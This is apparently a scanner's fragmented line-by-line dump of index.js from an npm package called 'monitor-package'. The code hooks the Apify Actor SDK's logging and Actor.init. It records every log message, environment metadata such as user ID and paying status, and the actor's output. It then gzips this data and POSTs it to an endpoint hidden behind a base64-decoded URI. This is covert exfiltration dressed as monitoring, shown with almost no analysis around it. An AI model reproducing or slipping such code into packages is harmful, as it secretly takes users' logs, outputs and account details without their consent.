// File: tmp/tmpyotri1na/monitor-package/package/index.js
// ======================================================================
Line 1: var fs = require("fs/promises")
Line 2: var fileURLToPath = require("url").fileURLToPath
Line 3: var dirname = require("path").dirname
Line 4: var gzip = require("zlib").gzip
Line 5: var promisify = require("util").promisify
Line 7: const __filename = fileURLToPath(import.meta.url)
Line 14: Buffer.from(URI, "base64").toString("utf-8")
Line 16: {
  ["info", "debug", "error", "warning"].forEach((method) => {
    const original = log[method];

    log[method] = async function (...args) {
      void fs.appendFile(
        join(__dirname, "log.txt"),
        `${method.toUpperCase()}: ${JSON.stringify(args)}\n`
      );
      return original.apply(this, args);
    };
  });

  const originalInit = Actor.init;
  Actor.init = async () => {
    const meta = {
      actor_run_id: process.env.ACTOR_RUN_ID || "",
      user_id: Number(process.env.APIFY_USER_ID || 0),
      user_is_paying: process.env.APIFY_USER_IS_PAYING === "1" ? "1" : "0",

      actor_id: process.env.ACTOR_ID || "",
      actor_name: process.env.ACTOR_FULL_NAME || "",
      actor_build_number: Number(process.env.ACTOR_BUILD_NUMBER || 0),
      actor_build_tags: process.env.ACTOR_BUILD_TAGS || "",

      actor_memory_bytes:
        Number(process.env.ACTOR_MEMORY_MBYTES || 0) * 1024 * 1024,
      actor_started_at: new Date(
        process.env.ACTOR_STARTED_AT || Da...
Line 17: ["info", "debug", "error", "warning"].forEach((method) => {
    const original = log[method];

    log[method] = async function (...args) {
      void fs.appendFile(
        join(__dirname, "log.txt"),
        `${method.toUpperCase()}: ${JSON.stringify(args)}\n`
      );
      return original.apply(this, args);
    };
  })
Line 18: const original = log[method]
Line 20: log[method] = async function (...args) {
      void fs.appendFile(
        join(__dirname, "log.txt"),
        `${method.toUpperCase()}: ${JSON.stringify(args)}\n`
      );
      return original.apply(this, args);
    }
Line 22: join(__dirname, "log.txt")
Line 62: join(__dirname, "meta.json")
Line 71: join(__dirname, "output.json")
Line 74: _tmp_6.push(data)
Line 78: {
      // Read meta and log files normally
      const [metaData, logData] = await Promise.all([
        fs.readFile(join(__dirname, "meta.json")),
        fs.readFile(join(__dirname, "log.txt")),
      ]);

      let outputData;
      try {
        const outputContent = await fs.readFile(
          join(__dirname, "output.json"),
          "utf-8"
        );
        const lines = outputContent
          .trim()
          .split("\n")
          .filter((line) => line.trim());
        const outputArray = lines.map((line) => JSON.parse(line));
        outputData = Buffer.from(JSON.stringify(outputArray, null, 2));
      } catch (e) {
        outputData = Buffer.from(JSON.stringify([], null, 2));
      }

      const [compressedMeta, compressedLog, compressedOutput] =
        await Promise.all([
          gzipAsync(metaData),
          gzipAsync(logData),
          gzipAsync(outputData),
        ]);

      const formData = new FormData();
      formData.append(
        "meta",
       ...
Line 80: const [metaData, logData] = await Promise.all([
        fs.readFile(join(__dirname, "meta.json")),
        fs.readFile(join(__dirname, "log.txt")),
      ])
Line 81: _tmp_7.push(fs.readFile(join(__dirname, "meta.json")))
Line 82: _tmp_7.push(fs.readFile(join(__dirname, "log.txt")))
Line 87: const outputContent = await fs.readFile(
          join(__dirname, "output.json"),
          "utf-8"
        )
Line 88: join(__dirname, "output.json")
Line 91: outputContent
          .trim()
Line 94: line.trim()
Line 95: const outputArray = lines.map((line) => JSON.parse(line))
Line 96: Buffer.from(JSON.stringify(outputArray, null, 2))
Line 97: catch (e) {
        outputData = Buffer.from(JSON.stringify([], null, 2));
      }
Line 98: outputData = Buffer.from(JSON.stringify([], null, 2))
Line 101: const [compressedMeta, compressedLog, compressedOutput] =
        await Promise.all([
          gzipAsync(metaData),
          gzipAsync(logData),
          gzipAsync(outputData),
        ])
Line 103: _tmp_11.push(gzipAsync(metaData))
Line 104: _tmp_11.push(gzipAsync(logData))
Line 105: _tmp_11.push(gzipAsync(outputData))
Line 111: _tmp_15.push(compressedMeta)
Line 116: _tmp_18.push(compressedLog)
Line 121: _tmp_21.push(compressedOutput)
Line 125: (_tmp_23 = fetch(URI, {
        method: "POST",
        headers: {
          "Content-Encoding": "gzip",
        },
        body: formData,
      })
        .then((response) => {}))
